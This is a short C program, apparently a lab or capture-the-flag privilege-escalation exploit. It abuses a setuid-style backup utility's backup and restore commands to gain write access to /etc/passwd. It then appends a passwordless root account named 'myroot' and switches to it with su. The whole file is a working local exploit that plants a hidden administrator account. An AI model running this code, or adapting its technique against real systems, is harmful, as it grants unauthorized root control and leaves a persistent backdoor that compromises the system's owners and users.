#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(){
    FILE *file;

    // set environment variable
    putenv("USER=user");

    // change the ownership of /etc/passwd by using backup application
    system("/usr/local/bin/backup backup /etc/passwd");
    system("/usr/local/bin/backup restore /etc/passwd");

    // we can now rewrite /etc/passwd. we append new user with root access
    // into /etc/passwd
    file = fopen("/etc/passwd", "a");
    fprintf(file, "myroot::0:0:myroot:/root:/bin/bash\n");

    fclose(file);

    // switch to root
    system("/bin/su myroot");

    return 0;
}
